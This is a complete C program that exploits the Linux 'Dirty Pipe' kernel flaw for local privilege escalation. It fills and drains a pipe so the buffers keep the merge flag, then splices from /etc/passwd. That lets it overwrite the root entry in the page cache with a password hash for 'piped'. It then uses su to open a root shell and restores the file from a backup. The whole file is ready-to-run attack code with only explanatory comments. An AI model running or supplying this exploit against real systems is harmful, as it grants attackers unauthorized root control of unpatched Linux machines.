/*
 * dirty_pipe_exploit.c
 *
 * This C program attempts to exploit a vulnerability related to uninitialized
 * flags in the Linux kernel's pipe implementation. It manipulates a file (/etc/passwd)
 * to set a new root password, demonstrating a security flaw.
 * Credits - Max Kellermann <max.kellermann@ionos.com>
 */

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * @brief Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    // Fill the pipe completely; each pipe_buffer will now have the PIPE_BUF_FLAG_CAN_MERGE flag
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    // Drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized)
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    // The pipe is now empty, and if somebody adds a new pipe_buffer without initializing its "flags",
    // the buffer will be mergeable
}

int main() {
    // Define the path to the target file
    const char *const path = "/etc/passwd";

    // Backup /etc/passwd to /tmp/passwd.bak
    printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
    FILE *f1 = fopen("/etc/passwd", "r");
    FILE *f2 = fopen("/tmp/passwd.bak", "w");

    // Check for file opening errors
    if (f1 == NULL) {
        printf("Failed to open /etc/passwd\n");
        exit(EXIT_FAILURE);
    } else if (f2 == NULL) {
        printf("Failed to open /tmp/passwd.bak\n");
        fclose(f1);
        exit(EXIT_FAILURE);
    }

    // Copy the content of /etc/passwd to /tmp/passwd.bak
    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    // Close the file descriptors
    fclose(f1);
    fclose(f2);

    // Specify the offset in the file to set the root password
    loff_t offset = 4; // after the "root"
    const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped
    printf("Setting root password to \"piped\"...\n");
    const size_t data_size = strlen(data);

    // Check if writing at a page boundary is possible
    if (offset % PAGE_SIZE == 0) {
        fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
        return EXIT_FAILURE;
    }

    // Calculate the next page boundary
    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;

    // Check if writing across a page boundary is possible
    if (end_offset > next_page) {
        fprintf(stderr, "Sorry, cannot write across a page boundary\n");
        return EXIT_FAILURE;
    }

    // Open the input file in read-only mode
    const int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        return EXIT_FAILURE;
    }

    // Retrieve file information
    struct stat st;
    if (fstat(fd, &st)) {
        perror("stat failed");
        return EXIT_FAILURE;
    }

    // Check if the specified offset is inside the file
    if (offset > st.st_size) {
        fprintf(stderr, "Offset is not inside the file\n");
        return EXIT_FAILURE;
    }

    // Check if enlarging the file is possible
    if (end_offset > st.st_size) {
        fprintf(stderr, "Sorry, cannot enlarge the file\n");
        return EXIT_FAILURE;
    }

    // Create the pipe with all flags initialized with PIPE_BUF_FLAG_CAN_MERGE
    int p[2];
    prepare_pipe(p);

    // Splice one byte from before the specified offset into the pipe
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return EXIT_FAILURE;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return EXIT_FAILURE;
    }

    // Write into the page cache, because of the PIPE_BUF_FLAG_CAN_MERGE flag
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("write failed");
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < data_size) {
        fprintf(stderr, "short write\n");
        return EXIT_FAILURE;
    }

    // Prepare command for shell execution
    char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                    "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                    "cp /tmp/passwd.bak /etc/passwd;"
                    "echo \\\"Done! Popping shell... (run commands now)\\\";"
                    "/bin/sh;"
                "\" root"};
    
    // Execute the shell command
    execv("/bin/sh", argv);

    // If execv fails, print an error message
    printf("system() function call seems to have failed :(\n");
    return EXIT_SUCCESS;
}
